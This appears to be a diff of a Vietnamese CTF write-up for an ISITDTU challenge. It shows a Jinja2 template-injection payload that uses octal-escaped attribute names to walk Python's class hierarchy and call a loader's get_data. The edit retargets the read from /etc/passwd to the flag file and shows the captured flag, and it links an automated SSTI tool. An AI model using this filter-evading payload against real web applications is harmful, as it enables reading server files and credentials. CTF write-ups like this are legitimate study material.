@@ -137,10 +137,12 @@ attr('\137\137CLASS\137\137'|lower)|
 attr('\137\137MRO\137\137'|lower)|
 last|
 attr('\137\137SUBCLASSES\137\137'%20|%20lower()|
-attr('\137\137GETITEM\137\137'%20|%20lower)(118)("/ETC/PASSWD","/ETC/PASSWD")|
-attr('GET\137DATA'%20|%20lower)("FLAG\056TXT"|lower)}}
+attr('\137\137GETITEM\137\137'%20|%20lower)(118)("/APP/FLAG\056TXT","/APP/FLAG\056TXT")|
+attr('GET\137DATA'%20|%20lower)("/APP/FLAG\056TXT"|lower)}}
 
 Tóm tắt cơ chế hoạt động, thì python nó có chỗ lưu các biến, hàm global hoặc ngoài context của class, cái này mọi người đọc.
 Thì mò một hồi, ra được cái hàm này :v đấm phát ăn luôn flag
 b'ISITDTU{tough_times_create_tough_guys!@@%#0@}\n'
 ```
+
+But faster: https://github.com/Marven11/Fenjing :(
